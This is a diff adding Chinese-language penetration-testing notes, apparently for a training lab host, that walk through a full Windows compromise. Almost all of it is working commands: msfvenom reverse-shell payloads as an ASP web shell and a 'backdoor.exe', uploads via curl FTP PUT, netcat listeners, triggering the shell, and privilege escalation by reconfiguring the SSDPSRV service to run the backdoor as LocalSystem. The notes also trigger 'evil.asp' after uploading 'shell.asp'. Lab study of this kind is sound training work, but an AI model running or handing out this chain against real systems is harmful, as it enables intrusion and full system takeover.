@@ -17,3 +17,49 @@ nc -lvp 443
 type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
 cat /root/proof.txt
 ifconfig沒反應....用 ifconfig-a
+
+
+
+
+生成asp
+msfvenom -p windows/shell_reverse_tcp LHOST=自己 LPORT=555 -f asp > shell.asp
+
+丟上去(一定要丟到資料夾內)
+curl -X PUT -T "shell.asp" "ftp://10.11.1.14/wwwroot/"
+
+監聽
+nc -lvp 555
+
+觸發
+http://10.11.1.14/evil.asp
+
+查看nc...已經進入，但是權限不足
+type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
+Access is denied
+
+進入c:\inetpub
+cd c:\inetpub
+
+加入管理員
+c:\inetpub>accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+
+在生成另一隻exe(將exe帶入c:\)
+msfvenom -p windows/shell_reverse_tcp LHOST=自己 LPORT=666 -f exe > backdoor.exe
+
+丟上去
+curl -X PUT -T "backdoor.exe" "ftp://10.11.1.14/wwwroot/"
+
+提權
+c:\inetpub>sc config SSDPSRV binpath= "c:\inetpub\backdoor.exe"
+c:\inetpub>sc config SSDPSRV obj= ".\localsystem"
+c:\inetpub>sc config SSDPSRV start= auto
+
+再丟一次去根目錄
+curl -X PUT -T "backdoor.exe" "ftp://10.11.1.14/"
+
+開msf
+
+
+
+重啟
+c:\inetpub>net start SSDPSRV
